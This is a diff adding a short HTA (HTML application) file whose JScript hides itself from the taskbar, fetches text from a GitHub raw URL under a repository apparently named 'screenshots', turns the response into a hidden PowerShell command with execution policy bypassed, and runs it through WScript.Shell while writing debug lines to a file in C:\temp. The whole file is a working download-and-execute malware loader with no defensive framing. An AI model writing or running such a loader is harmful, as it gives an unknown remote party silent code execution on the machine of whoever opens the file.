@@ -1,0 +1,17 @@
+<html><head><hta:application showintaskbar="no"/><script language=JScript>
+var fso=new ActiveXObject("Scripting.FileSystemObject");
+var log=fso.CreateTextFile("C:\\temp\\t3_debug.txt",true);
+try{
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
+x.send();
+log.WriteLine("HTTP status: "+x.status);
+log.WriteLine("Response: "+x.responseText.substring(0,100));
+var cmd="powershell -NoP -Ex ByP -c \""+x.responseText.replace(/\n/g,";")+"\"";
+log.WriteLine("CMD: "+cmd.substring(0,200));
+var sh=new ActiveXObject("WScript.Shell");
+sh.Run(cmd,0);
+log.WriteLine("Shell.Run OK");
+}catch(e){log.WriteLine("ERROR: "+e.message);}
+log.Close();
+</script></head></html>
